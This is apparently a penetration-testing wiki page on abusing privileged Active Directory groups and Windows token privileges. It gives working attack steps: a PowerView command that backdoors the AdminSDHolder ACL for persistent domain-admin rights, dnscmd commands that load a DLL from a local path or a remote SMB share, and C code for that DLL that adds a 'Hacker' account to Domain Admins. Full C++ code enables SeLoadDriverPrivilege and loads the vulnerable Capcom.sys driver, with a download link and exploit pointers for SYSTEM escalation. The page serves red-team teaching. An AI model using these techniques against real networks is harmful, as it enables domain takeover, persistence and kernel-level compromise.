# Privileged Accounts and Token Privileges

## Known groups with administration privileges

* **Administrators**
* **Domain Admins**
* **Enterprise Admins**

There are other account memberships and access token privileges that can also be useful during security assessments when chaining multiple attack vectors.

## AdminSDHolder  group

The Access Control List \(ACL\) of the **AdminSDHolder** object is used as a template to **copy** **permissions** to **all “protected groups”** in Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins.  
By default, the ACL of this group is copied inside all the "protected groups". This is done to avoid intentional or accidental changes to these critical groups. However, if an attacker modifies the ACL of the group **AdminSDHolder** for example giving full permissions to a regular user, this user will have full permissions on all the groups inside the protected group \(in an hour\).  
And if someone tries to delete this user from the Domain Admins \(for example\) in an hour or less, the user will be back in the group.

Add a user to the **AdminSDHolder** group:

```csharp
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
```

Check if the user is inside the **Domain Admins** group:

```text
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

If you don't want to wait an hour you can use a PS script to make the restore happen instantly: [https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)

\*\*\*\*[**More information in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)\*\*\*\*

## Account Operators <a id="account-operators"></a>

* Allows creating non administrator accounts and groups on the domain
* Allows logging in to the DC locally

Note the spotless' user membership:

![](../../.gitbook/assets/1%20%282%29%20%281%29%20%281%29.png)

However, we can still add new users:

![](../../.gitbook/assets/a2.png)

As well as login to DC01 locally:

![](../../.gitbook/assets/a3.png)

## Server Operators <a id="server-operators"></a>

This membership allows users to configure Domain Controllers with the following privileges:

* Allow log on locally
* Back up files and directories
* Change the system time
* Change the time zone
* Force shutdown from a remote system
* Restore files and directories
* Shut down the system

Note how we cannot access files on the DC with current membership:

![](../../.gitbook/assets/a4.png)

However, if the user belongs to `Server Operators`:

![](../../.gitbook/assets/a5.png)

The story changes:

![](../../.gitbook/assets/a6.png)

## Backup Operators <a id="backup-operators"></a>

As with `Server Operators` membership, we can access the `DC01` file system if we belong to `Backup Operators`:

![](../../.gitbook/assets/a7.png)

## DnsAdmins

### Resume

A user who is member of the **DNSAdmins** group or have **write privileges to a DNS** server object can load an **arbitrary DLL** with **SYSTEM** privileges on the **DNS server**.  
This is really interesting as the **Domain Controllers** are used very frequently as DNS servers.

### Execute

Then, if you have a user inside the DNSAdmins group, you can make the DNS server load an arbitrary DLL with SYSTEM privileges. You can make the DNS server load a local or remote \(shared by SMB\) DLL file executing:

```text
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
```

An example of a valid DLL can be found in [https://github.com/kazkansouh/DNSAdmin-DLL](https://github.com/kazkansouh/DNSAdmin-DLL). I would change the code of the function `DnsPluginInitialize`  to something like:

```c
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
		system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
		system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

So, when the **DNSservice** start or restart, a new user will be created.

Even having a user inside DNSAdmin group you **by default cannot stop and restart the DNS service.** But you can always try doing:

```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

\*\*\*\*[**Learn more about this privilege escalation in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)

## **AD Recycle Bin**

This group gives you permission to read deleted AD object. Something juicy information can be found in there:

```bash
#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
#You need to be in the "AD Recycle Bin" group of the AD to list the deleted AD objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

## Group Managed Service Accounts \(gMSA\)

 In most of the infrastructures, service accounts are typical user accounts with “**Password never expire**” option. Maintaining these accounts could be a real mess and that's why Microsoft introduced  **Managed Service Accounts:**

* No more password management. It uses a complex, random, 240-character password and changes that automatically when it reaches the domain or computer password expire date. 
  * It is uses Microsoft Key Distribution Service \(KDC\) to create and manage the passwords for the gMSA.
* It cannot be lock out or use for interactive login
* Supports to share across multiple hosts
* Can use to run schedule tasks \(Managed service accounts do not support to run schedule tasks\)
* Simplified SPN Management – System will automatically change the SPN value if **sAMaccount** details of the computer change or DNS name property change.

 gMSA accounts have their passwords stored in a LDAP property called _**msDS-ManagedPassword**_ which **automatically** get **resets** by the DC’s every 30 days, are **retrievable** by **authorized administrators** and by the **servers** who they are installed on. _**msDS-ManagedPassword**_ is an encrypted data blob called [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) and it’s only retrievable when the connection is secured, **LDAPS** or when the authentication type is ‘Sealing & Secure’ for an example.

![Image from https://cube0x0.github.io/Relaying-for-gMSA/](../../.gitbook/assets/asd1.png)

So, if gMSA is being used, find if it has **special privileges** and also check if you have **permissions** to **read** the password of the services.

Also, check this [web page](https://cube0x0.github.io/Relaying-for-gMSA/) about how to perform a **NTLM relay attack** to **read** the **password** of **gMSA**.

## SeLoadDriverPrivilege <a id="seloaddriverprivilege"></a>

A very dangerous privilege to assign to any user - it allows the user to load kernel drivers and execute code with kernel privilges aka `NT\System`. See how `offense\spotless` user has this privilege:

![](../../.gitbook/assets/a8.png)

`Whoami /priv` shows the privilege is disabled by default:

![](../../.gitbook/assets/a9.png)

However, the below code allows enabling that privilege fairly easily:

{% code title="privileges.cpp" %}
```c
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>

int main()
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	bool bEnablePrivilege(true);
	HANDLE hToken(NULL);
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		L"SeLoadDriverPrivilege",   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		printf("LookupPrivilegeValue error: %un", GetLastError());
		return FALSE;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	
	if (bEnablePrivilege) {
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}
	
	// Enable the privilege or disable all privileges.
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("AdjustTokenPrivileges error: %x", GetLastError());
		return FALSE;
	}

	system("cmd");
    return 0;
}
```
{% endcode %}

We compile the above, execute and the privilege `SeLoadDriverPrivilege` is now enabled:

![](../../.gitbook/assets/a10.png)

### Capcom.sys Driver Exploit <a id="capcom-sys-driver-exploit"></a>

To further prove the `SeLoadDriverPrivilege` is dangerous, let's **exploit it to elevate privileges**.

You can load a new driver using  **NTLoadDriver:**

```cpp
NTSTATUS NTLoadDriver(
  _In_ PUNICODE_STRING DriverServiceName
);
```

By default the driver service name should be under `\Registry\Machine\System\CurrentControlSet\Services\`

But, according with to the **documentation** you **could** also **use** paths under **HKEY\_CURRENT\_USER**, so you could **modify** a **registry** there to **load arbitrary drivers** on the system.  
The relevant parameters that must be defined in the new registry are:

* **ImagePath:** REG\_EXPAND\_SZ type value which specifies the driver path. In this context, the path should be a directory with modification permissions by the non-privileged user.
* **Type**: Value of type REG\_WORD in which the type of the service is indicated. For our purpose, the value should be defined as SERVICE\_KERNEL\_DRIVER \(0x00000001\).

Therefore you could create a new registry in **`\Registry\User\<User-SID>\System\CurrentControlSet\MyService`** indicating in **ImagePath** the path to the driver and in **Type** the with value 1 and use those values on the exploit \(you can obtain the User SID using: `Get-ADUser -Identity 'USERNAME' | select SID` or `(New-Object System.Security.Principal.NTAccount("USERNAME")).Translate([System.Security.Principal.SecurityIdentifier]).value`

```bash
PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
PCWSTR pPathSourceReg = L"\\Registry\\User\\<User-SID>\\System\\CurrentControlSet\\MyService";
```

The first one declares a string variable indicating where the vulnerable **Capcom.sys** driver is located on the victim system and the second one is a string variable indicating a service name that will be used \(could be any service\).  
Note, that the **driver must be signed by Windows** so you cannot load arbitrary drivers. But, **Capcom.sys** **can be abused to execute arbitrary code and is signed by Windows**, so the goal is to load this driver and exploit it.

 Load the driver:

```c
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <ntsecapi.h>
#include <stdlib.h>
#include <locale.h>
#include <iostream>
#include "stdafx.h"

NTSTATUS(NTAPI *NtLoadDriver)(IN PUNICODE_STRING DriverServiceName);
VOID(NTAPI *RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
NTSTATUS(NTAPI *NtUnloadDriver)(IN PUNICODE_STRING DriverServiceName);

int main()
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	bool bEnablePrivilege(true);
	HANDLE hToken(NULL);
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		L"SeLoadDriverPrivilege",   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		printf("LookupPrivilegeValue error: %un", GetLastError());
		return FALSE;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	
	if (bEnablePrivilege) {
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}
	
	// Enable the privilege or disable all privileges.
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("AdjustTokenPrivileges error: %x", GetLastError());
		return FALSE;
	}

	//system("cmd");
	// below code for loading drivers is taken from https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/RDI/dll/NtLoadDriver.h
	std::cout << "[+] Set Registry Keys" << std::endl;
	NTSTATUS st1;
	UNICODE_STRING pPath;
	UNICODE_STRING pPathReg;
	PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
  PCWSTR pPathSourceReg = L"\\Registry\\User\\<User-SID>\\System\\CurrentControlSet\\MyService";
	const char NTDLL[] = { 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c, 0x00 };
	HMODULE hObsolete = GetModuleHandleA(NTDLL);
	*(FARPROC *)&RtlInitUnicodeString = GetProcAddress(hObsolete, "RtlInitUnicodeString");
	*(FARPROC *)&NtLoadDriver = GetProcAddress(hObsolete, "NtLoadDriver");
	*(FARPROC *)&NtUnloadDriver = GetProcAddress(hObsolete, "NtUnloadDriver");

	RtlInitUnicodeString(&pPath, pPathSource);
	RtlInitUnicodeString(&pPathReg, pPathSourceReg);
	st1 = NtLoadDriver(&pPathReg);
	std::cout << "[+] value of st1: " << st1 << "\n";
	if (st1 == ERROR_SUCCESS) {
		std::cout << "[+] Driver Loaded as Kernel..\n";
		std::cout << "[+] Press [ENTER] to unload driver\n";
	}

	getchar();
	st1 = NtUnloadDriver(&pPathReg);
	if (st1 == ERROR_SUCCESS) {
		std::cout << "[+] Driver unloaded from Kernel..\n";
		std::cout << "[+] Press [ENTER] to exit\n";
		getchar();
	}

    return 0;
}
```

Once the above code is compiled and executed, we can see that our malicious `Capcom.sys` driver gets loaded onto the victim system:

![](../../.gitbook/assets/a11.png)

Download: [Capcom.sys - 10KB](https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTyWsUdKa48PyMRyZ4I%2F-LTyZ9IkoofuWRxlNpUG%2FCapcom.sys?alt=media&token=e4417fb3-f2fd-42ef-9000-d410bc6ceb54)

**No it's time to abuse the loaded driver to execute arbitrary code.**

You can download exploits from [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom) and [https://github.com/zerosum0x0/puppetstrings](https://github.com/zerosum0x0/puppetstrings) and execute it on the system to elevate our privileges to `NT Authority\System`:

![](../../.gitbook/assets/a12.png)

### Auto

You can use [https://github.com/TarlogicSecurity/EoPLoadDriver/](https://github.com/TarlogicSecurity/EoPLoadDriver/) to **automatically enable** the **privilege**, **create** the **registry key** under HKEY\_CURRENT\_USER and **execute NTLoadDriver** indicating the registry key that you want to create and the path to the driver:

![](../../.gitbook/assets/image%20%2845%29.png)

Then, you will need to download a **Capcom.sys** exploit and use it to escalate privileges.

## References <a id="references"></a>

{% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory" %}

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--" %}

{% embed url="https://adsecurity.org/?p=3658" %}

{% embed url="http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://rastamouse.me/2019/01/gpo-abuse-part-1/" %}

{% embed url="https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp\#L13" %}

{% embed url="https://github.com/tandasat/ExploitCapcom" %}

{% embed url="https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp" %}

{% embed url="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys" %}

{% embed url="https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e" %}

{% embed url="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html" %}



